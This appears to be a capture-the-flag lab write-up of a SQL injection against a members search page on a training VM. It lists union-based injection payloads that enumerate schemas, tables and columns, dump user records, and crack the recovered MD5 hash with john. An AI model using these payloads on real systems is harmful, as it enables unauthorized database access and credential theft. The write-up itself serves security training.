# SQL injection
- a type of attack where a malicious user attempts to pass input that alters the final SQL query sent by the web application to the database
- the attacker first injects SQL code and then manipulates the web application logic, either by changing the original query or executing a completely new one
- https://book.hacktricks.xyz/pentesting-web/sql-injection

<b>keywords</b>: SQL advanced<br>
<b>attacked site</b>: http://borntosec.42/?page=members

## Exploit
On the member page, there's a search bar. After entering a string to search for, the backend likely executes a query to the database to retrieve and display data. To check if SQL injection is possible, we pass a punctuation mark (<code>'</code>) as input:
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1
```
This input disrupts the database and generates an error, indicating that SQL injection may be possible. Next, we’ll determine the number of columns in the table using the <code>ORDER BY</code> clause. We increment the column index to identify when the table ends:
``` SQL
1 OR 1=1 ORDER BY 1-- -
1 OR 1=1 ORDER BY 2-- -
1 OR 1=1 ORDER BY 3-- -
```
The third column is inaccessible, meaning the table has 2 columns. We can now check the database version and username:
``` sql
1 OR 1=1 UNION SELECT @@version,user()-- -
```
└─     Output:
```
ID: 1 OR 1=1 UNION SELECT @@version,user()-- - 
First name: 5.5.64-MariaDB-1ubuntu0.14.04.1
Surname : borntosec@localhost
```
Next, we retrieve the names of all database schemas:
``` sql
1 OR 1=1 UNION SELECT 1,schema_name from INFORMATION_SCHEMA.SCHEMATA-- -
```
└─     Output:
```
information_schema
Member_Brute_Force
Member_Sql_Injection
Member_guestbook
Member_images
Member_survey
```
We proceed by identifying the current database:
``` sql
1 OR 1=1 UNION SELECT 1,database()-- -
```
└─     Output:
```
Member_Sql_Injection
```
With the current database identified, we search for a table that might contain the flag:
``` sql
1 OR 1=1 UNION SELECT TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES-- -
```
└─     Output:
```
[...]
ID: 1 OR 1=1 UNION SELECT TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES--  
First name: users
Surname : Member_Sql_Injection
[...]
```
Next, we check the columns in this table:
``` sql
1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS-- -
```
└─     Filtered output:
```
[...]
ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
First name: user_id
Surname : users

ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
First name: first_name
Surname : users

ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
First name: last_name
Surname : users

ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
First name: town
Surname : users

ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
First name: country
Surname : users

ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
First name: planet
Surname : users

ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
First name: Commentaire
Surname : users

ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
First name: countersign
Surname : users
[...]
```
Enumerating the columns manually is time-consuming, so we concatenate the column values and display them in the second column:
``` sql
1 OR 1=1 UNION SELECT 1, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
```
└─     Output:
```
ID: 1 OR 1=1 UNION SELECT 1, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users 
First name: 1
Surname : FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```
The output provides a hashed password. We use <code>hash-identifier</code> to determine the hash type:
``` shell
└─$ hash-identifier sql_hash.txt                                                     
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 5ff9d0165b4f92b14994e5c685cdce28

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
Knowing the hash type, we brute-force the password using <code>john</code>:
``` shell
└─$ john sql_hash.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/5million.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
FortyTwo         (?)     
1g 0:00:00:00 DONE (2024-08-08 23:22) 7.142g/s 16457p/s 16457c/s 16457C/s amore..marianne
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Finally, we hash the password in lowercase using SHA-256:
``` shell
└─$ echo -n "fortytwo" | sha256sum
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  -
```
## Flag
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
